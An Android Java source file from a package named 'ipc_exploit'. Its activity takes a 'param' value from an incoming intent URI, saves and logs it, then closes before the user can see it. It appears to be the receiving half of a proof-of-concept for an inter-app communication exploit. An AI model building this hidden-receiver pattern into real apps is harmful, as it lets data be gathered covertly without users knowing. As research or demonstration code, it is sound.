package de.phynformatik.ipc_exploit;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;

public class Receiver extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
     
        // Get data from intent
        Intent i = getIntent();
        Uri uri = i.getData();
        String data = uri.getQueryParameter("param");
        
        // Open shared preferences and store the response for later usage
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
        Editor e = sp.edit();
        e.putString("response", data);
        e.apply();
        
        // Print the server response to error log
        Log.e("IPC Exploit", data);
        
        // Close the activity before it is fully displayed, so it will never be visible to the user
        finish();
        
    }

    
    
}